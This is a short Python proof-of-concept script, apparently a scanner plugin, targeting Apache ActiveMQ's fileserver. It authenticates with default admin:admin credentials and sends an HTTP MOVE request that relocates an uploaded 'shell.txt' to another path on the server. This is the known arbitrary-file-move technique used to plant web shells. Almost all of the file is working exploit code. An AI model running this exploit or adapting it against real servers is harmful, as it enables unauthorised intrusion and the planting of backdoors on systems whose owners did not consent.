#!/usr/bin/env python
# coding: utf-8
# Date  : 2018-07-12 17:47:56
# Author: b4zinga
# Email : b4zinga@outlook.com
# Func  :

import base64
import requests


def run(url):
    """任意文件"""
    user = "admin"
    pwd = "admin"
    headers = {
            'Authorization' : 'Basic ' + base64.b64encode((user + ':' + pwd).encode()).decode(),
            'Destination':'file:/tmp/test.txt',
        }
    req = requests.request('MOVE', url+':8161/fileserver/shell.txt', headers=headers, timeout=5)
    if req.status_code == 204:
        return 'ActiveMQ move file success'
    else:
        return False